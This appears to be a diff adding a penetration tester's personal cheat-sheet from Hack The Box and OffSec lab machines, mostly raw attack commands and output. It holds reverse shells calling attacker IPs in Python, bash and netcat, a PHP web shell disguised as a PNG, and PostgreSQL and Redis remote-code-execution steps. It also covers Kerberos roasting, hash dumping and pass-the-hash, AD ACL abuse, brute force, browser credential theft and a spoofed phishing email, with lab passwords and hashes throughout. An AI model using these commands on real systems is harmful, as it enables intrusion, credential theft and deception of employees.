@@ -1,0 +1,521 @@
+								#active directory machine vip notes all commands and other # 
+
+shell payloads: - 
+python : - 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python other shell : - 
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.16",4444));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tmp/f' | tee -a monitor.sh
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.68/4444 0>&1' > n00bDi.sh
+tar -cvf n00bDi.tar n00bDi.sh
+sudo -u onuma tar -xvf n00bDi.tar --to-command /bin/bash
+
+echo " nc -lvp 4444 -e /bin/bash &" > product-control
+
+bash shell.sh 
+#!/bin/bash
+
+/bin/bash -i >& /dev/tcp/192.168.49.157/9002 0>&1
+
+
+nmap commands : - 
+nmap -A -sC -sV -T4 -Pn -o nmap --min-rate 15000 cascade.htb
+nmap -p- --min-rate=1000 -T4 10.129.1.77 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//
+ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.180 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.129.95.180
+ nmapAutomator.sh --host 192.168.173.69 -t port
+nmapAutomator.sh --host 192.168.173.134 -t full
+nmap -n -sV --scirpt "ldap* and not brute" x.x.x.x
+
+
+ldap enumeration : - 
+ldapsearch -x -H ldap://10.129.238.31 -b "dc=cascade,dc=local" > cascade-ldap.txt
+ldapsearch -x -H ldap://hutch -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:
+ldapserach -x -H ldap://hutch -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
+
+
+evil-winrm : - 
+evil-winrm -i cascade.htb -u s.smith -p sT333ve2  
+evil-winrm -u arksvc -p "w3lc0meFr31nd" -i cascade.htb
+evil-winrm -i 10129.95.180 -u svc_loanmgr -p 'Monkeymakestheworldgoround!
+
+crackmapexec : - 
+crackmapexec smb -u s.smith -p sT333ve2 --shares cascade.htb
+crackmapexec winrm cascade.htb -u users -p w3lc0meFr31nd --continue-on-success
+crackmapexec winrm cascade.htb -u administrator -p baCT3r1aN00dles
+crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
+crackmapexec smb 10.129.240.13 -u james -p 'J@m3s_P@ssW0rd!'
+crackmapexec smb 10.129.242.151  -u marco -p 'Welcome123!' --continue-on-success
+crackmapexec smb 10.129.242.151 -u users.txt -p 'Welcome123!' --continue-on-success
+crackmapexec ldap hutch -d hutch.offsec -u administrator -p 'GOJ164HNk.j6@}' --kdcHost hutch
+
+
+smbclient : - 
+smbclient --user s.smith //cascade.htb/Audit$ sT333ve2
+smbclient -L \\\\10.129.241.165
+smbclient -L 10.129.209.64 
+smbclient \\\\10.129.209.64\\general -N
+smbclient \\\\10.129.209.64\\Development -N
+smbclient -L //helpdesk -U '' 
+smbclient -N -L //10.129.240.13
+	mask ""
+	prompt off
+	recurse on 
+	1cd smb-audit-loot/
+	mget *
+
+smbmap : - 
+smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
+smbmap -H 10.129.240.13
+
+
+nullinux : - 
+nullinux 10.129.241.165
+
+impacket-GetNPUsers : - 
+impacket-GetNPUsers -dc-ip 10.129.241.165 -request 'htb.local/' -format hashcat
+for user in $(cat users); do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.10.10.52 2>/dev/null | grep -F -e '[+]' -e '[-]'; done
+GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
+for user in $(cat users); do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.129.240.13 2>/dev/null | grep -F -e '[+]' -e '[-]'; done
+
+
+impacket-secretdump : - 
+impacket-secretsdump htb.local/bigb0ss:bigb0ss@10.129.241.165 -just-dc-user administrator
+impakcet-secretsdump egotistical-bank.local/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
+
+impacket-psexec : - 
+impacket-psexec htb.local/administrator@10.129.241.165 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 
+impakcet-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+
+
+impacket-goldenpac : - 
+impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
+
+impacket-GetADUsers : - 
+impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.129.95.180 -dubug
+
+
+
+hashcat : - 
+hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
+hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt --force
+
+
+steghide : -
+ steghide info irked.jpg 
+steghide extract -sf irked.jpg 
+
+exiftool : - 
+exiftool AppLocker.docx
+
+
+rpcclient : - 
+rpcclient -U '' -N x.x.x.x
+rpcclient -U htb.local/james 10.10.10.52
+rpcclient 10.129.240.13 -U '' -N
+rpcclient -U htb.local/james 10.129.240.13
+querydispinfo
+enumdomusers
+enumdomgroups
+
+kerbrute : - 
+kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52
+kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc  10.129.240.13
+
+decode : - 
+perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
+echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
+echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
+ perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
+
+base64 decode script : - 
+import base64
+        inp_string = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo="
+        times = 13
+        for i in range(times):
+                inp_string = base64.b64decode(inp_string)
+        out_string = inp_string.decode('UTF-8')
+        print(out_string)
+
+
+mssqlclient.py : - 
+
+mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
+impacket-mssqlclient 'sa:m$$ql_S@_P@ssW0rd!@10.129.240.13
+
+file transfer : - 
+scp pi@mirai.htb:/home/pi/usb.dd .
+scp charix@10.129.1.254:secret.zip .
+scp -i deployment_key.txt /home/kali/Downloads/PrivescCheck/PrivescCheck.ps1 p4yl0ad@192.168.120.235:C:\Users\p4yl0ad\Documents/PrivescCheck.ps1
+scp -o StrictHostKeyChecking=no -r elliot@192.168.120.148:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db /home/kali/firefox_decrypt/"
+dquote> 
+
+scp -o StrictHostKeyChecking=no -r elliot@192.168.120.148:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db /home/rohit/Desktop/offsec_machine/InsanityHosting/firefox_decrypt 
+scp -o StrictHostKeyChecking=no -r elliot@192.168.121.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cookies.sqlite /home/rohit/Desktop/offsec_machine/InsanityHosting/firefox_decrypt
+
+
+
+image paylod : - 
+echo '<?php' >> ./shell.php.png
+echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.69 1337 >/tmp/f");' >> ./shell.php.png
+echo '?>' >> ./shell.php.png
+
+curl download data and upload data : - 
+curl http://poison.htb/browse.php?file=pwdbackup.txt > data
+curl http://poison.htb/browse.php?file=/etc/passwd | grep charix
+curl -s -v http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.68/
+curl -I 192.168.58.126
+curl http://readys/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php -o test.php
+curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'
+curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'
+curl -T '/home/rohit/Desktop/warmup/windows/hutch/shell.aspx' 'http://hutch' =u fmcsorley:CrabSharkJellyfish192
+
+
+port fordwarding : - 
+ssh -L 5904:localhost:5901 charix@10.129.1.254
+	now : - vncviewer -passwd secret localhost:5904
+
+smtp-user-enum : - 
+smtp-user-enum -M RCPT -U test-users.txt -t 10.129.241.121
+smtp-user-enum -M RCPT -U departments.txt -t postfish.off
+
+mail send : - 
+sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.129.241.121 -v
+
+read file in .xml format in windows machine : - 
+
+C:\Users\nico\Desktop>type cred.xml
+type cred.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+
+
+bloodhound enumeration : - 
+powershell 
+powershell -ep bypass
+.\PowerView.ps1
+ Set-DomainObjectOwner -Identity claire -OwnerIdentity tom  
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+ $creds = ConvertTo-SecureString 'Qwerty123!' -AsPlainText -Force
+Set-DomainUserPassword -identity claire -accountpassword $creds -Verbose
+
+ldap enumeration : - 
+./windapsearch -d egotistical-bank.local -dc-ip 10.129.95.180 -u 
+
+now enumerate with bloodhound 
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+
+
+install bloodhound : - 
+sudo apt install bloodhound
+sudo pip install  bloodhound-python 
+bloodhound-python -u svc_loanmgr -p Monkeymakestheworldgoround! -d egotistical-bank.local -ns 10.129.95.180 -c All 
+
+after complete enumeration bloodhound files now compress the files into a zip and upload it 
+
+zip info.zip *.json
+
+neo4j console 
+bloodhound 
+
+now upload zip file to enumerate domain users
+
+finger enumeration : - 
+finger @10.129.212.7
+finger hackervegas001@10.129.212.7
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.212.7
+finger sunny@10.129.212.7
+
+download exploit and other using wget : - 
+wget https://www.exploit-db.com/raw/4761 -O black-hole.pl
+
+hydra : - 
+hydra -C /home/rohit/Desktop/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt exghost ftp
+hydra -L users.txt -P users.txt postfish pop3
+
+
+enum4linux.py : - 
+enum4linux-ng.py -A helpdesk
+
+postgresql enumeration : - 
+psql -h nibbles -p 5437 -U postgres
+	SELECT version();
+	SELECT pg_ls_dir('./');
+	SELECT pg_ls_dir('/home');
+	SELECT pg_ls_dir('/home/wilson');
+	SELECT pg_read_file('/home/wilson/local.txt');
+	CREATE TABLE kashz (out TEXT);
+	COPY kashz from '/etc/passwd';
+	SELECT * from kashz;
+	COPY kashz FROM PROGRAM 'whoami;id;hostname;uname -a';
+	SELECT * from kashz;
+	
+now start your listner 
+	COPY kashz from PROGRAM '/usr/bin/nc -e /bin/bash 192.168.49.173 80';
+
+pop3 service enumeration and exploitation : - 
+┌──(root㉿kali)-[/home/…/offensive-security/get-to-work/linux/postfish]
+└─# nc -v postfish.off 110
+postfish [192.168.155.137] 110 (pop3) open
++OK Dovecot (Ubuntu) ready.
+USER hr
++OK
+PASS hr
+-ERR [AUTH] Authentication failed.
+USER sales
++OK
+PASS sales
++OK Logged in.
+LIST
++OK 1 messages:
+1 683
+.
+RETR 1
++OK 683 octets
+Return-Path: <it@postfish.off>
+X-Original-To: sales@postfish.off
+Delivered-To: sales@postfish.off
+Received: by postfish.off (Postfix, from userid 997)
+        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
+Received: from x (localhost [127.0.0.1])
+        by postfish.off (Postfix) with SMTP id 7712145434
+        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+Subject: ERP Registration Reminder
+Message-Id: <20210331131139.7712145434@postfish.off>
+Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+From: it@postfish.off
+
+Hi Sales team,
+
+We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
+
+Regards,
+IT
+.
+-ERR Disconnected for inactivity.
+
+
+##This message was sent from the IT department (`it@postfish.off`) to the sales department (`sales@postfish.off`). Sounds like the sales department will be expecting en email from IT containing a link to reset their password in the new system.
+
+This looks like a prime opportunity for a phishing campaign!
+
+──(root㉿kali)-[/home/…/offensive-security/get-to-work/linux/postfish]
+└─# nc -v postfish.off 25
+postfish [192.168.155.137] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+
+## We'll send this email from the `it@postfish.off` mailbox to `sales@postfish.off`.
+
+
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: sales@postfish.off
+250 2.1.5 Ok
+
+##Before sending the message, we'll start a Netcat listener on port 80
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80
+listening on [any] 80 ...
+```
+
+
+Next, we'll enter the message body that will contain a link to our attacking machine. Nothing special needs to be in the link. For example, our message could look like this.
+
+```
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Reset
+
+Hello,
+
+Unfortunately we had a problem during our migration and we had to rebuild our database.
+Please register at http://192.168.118.5/ and let us know if you encounter any problems.
+
+Regards,
+IT
+.
+250 2.0.0 Ok: queued as 3E6F9458E2
+QUIT
+221 2.0.0 Bye
+──(root㉿kali)-[/home/…/offensive-security/get-to-work/linux/postfish]
+└─# nc -v postfish.off 25
+postfish [192.168.155.137] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+
+## We'll send this email from the `it@postfish.off` mailbox to `sales@postfish.off`.
+
+
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: sales@postfish.off
+250 2.1.5 Ok
+
+##Before sending the message, we'll start a Netcat listener on port 80
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80
+listening on [any] 80 ...
+```
+
+
+Next, we'll enter the message body that will contain a link to our attacking machine. Nothing special needs to be in the link. For example, our message could look like this.
+
+```
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Reset
+
+Hello,
+
+Unfortunately we had a problem during our migration and we had to rebuild our database.
+Please register at http://192.168.118.5/ and let us know if you encounter any problems.
+
+Regards,
+IT
+.
+250 2.0.0 Ok: queued as 3E6F9458E2
+QUIT
+221 2.0.0 Bye
+
+┌──(kali㉿kali)-[~]
+└─$ nc -v postfish.off 25
+postfish.off [192.168.120.41] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+...
+```
+If the recipient we supply is not correct, we will get an error.
+
+```
+...
+RCPT TO: user@postfish.off
+550 5.1.1 <user@postfish.off>: Recipient address rejected: User unknown in local recipient table
+```
+
+Generally, companies adopt a naming convention, which implies that all mail addresses for the company follow a specific pattern. One such example could be the first letter of the first name followed by the entire lastname, like `bmoore`. Another example could be `b.moore`. Yet another example could be simply `brian`.
+
+Let's try a few of these conventions with Brian Moore until we discover the right one.
+```
+...
+RCPT TO: b.moore@postfish.off
+550 5.1.1 <b.moore@postfish.off>: Recipient address rejected: User unknown in local recipient table
+RCPT TO: bmoore@postfish.off
+550 5.1.1 <bmoore@postfish.off>: Recipient address rejected: User unknown in local recipient table
+RCPT TO: brian@postfish.off
+550 5.1.1 <brian@postfish.off>: Recipient address rejected: User unknown in local recipient table
+...
+```
+No luck so far, but let's try another common convention.
+
+```
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+...
+```
+Great! Looks like we have found the pattern of how mailbox names are formed at this company. With our Netcat listener still running, let's tailor our malicious message for Brian and send it.
+
+```
+...
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Reset
+
+Hey Brian,
+
+Unfortunately we had a problem during our migration and we had to rebuild our database.
+Please register at http://192.168.118.5/ and let us know if you encounter any problems.
+
+Regards,
+IT
+.
+250 2.0.0 Ok: queued as F0B6F458E2
+QUIT
+221 2.0.0 Bye
+
+┌──(kali㉿kali)-[~]
+└─$ nc -v postfish.off 25
+postfish.off [192.168.120.41] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Pwned!
+.
+250 2.0.0 Ok: queued as 941A745436
+quit
+221 2.0.0 Bye
+
+┌──(kali㉿kali)-[~]
+└─$
+```
+As soon as the message is delivered, the disclaimer script is executed, and we are granted our shell.
+┌──(root㉿kali)-[/home/…/offensive-security/get-to-work/linux/postfish]
+└─# nc -nlvp 4444    
+listening on [any] 4444 ...
+connect to [192.168.49.155] from (UNKNOWN) [192.168.155.137] 54376
+bash: cannot set terminal process group (15198): Inappropriate ioctl for device
+bash: no job control in this shell
+filter@postfish:/var/spool/postfix$ id
+id
+uid=997(filter) gid=997(filter) groups=997(filter)
+filter@postfish:/var/spool/postfix$ whoami
+whoami
+filter
+
+redis-cli enumeration ; - 
+redis-cli -h 192.168.173.69
+	info server
+	config get dir
+	config set dir /var/www/html
+	config set dbfilename verma.txt
+	set test"verma"
+	save
+	
+python redis-master.py -r  192.168.173.69 -p 6379 -L 192.168.49.173 -P 27017 -f RedisModulesSDK/exp.so -c "id"
+now start your listner 
+python3 redis-master.py -r 192.168.173.69 -p 6379 -L 192.168.49.173 -P 27017 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.49.173/6379 0>&1'" 
+
+ssh connection : - 
+ssh -o StrictHostkeyChecking=no elliot@192.168.121.124
